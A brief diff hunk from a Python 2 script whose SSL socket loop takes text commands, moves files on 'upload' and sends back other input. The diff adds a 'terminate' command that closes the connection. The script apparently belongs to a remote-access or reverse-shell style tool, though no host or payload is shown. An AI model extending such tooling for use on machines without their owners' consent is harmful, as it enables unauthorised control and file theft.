@@ -53,6 +53,9 @@ while 1:
         chunk = RecvData()
     elif inText.startswith("upload"):
         DownloadFILE(inText.split(" ")[1])
+    elif inText == "terminate":
+        ssl_sock.close()
+        sys.exit(0)
     else:
         print '[inText] ' + inText
         SendData(inText)
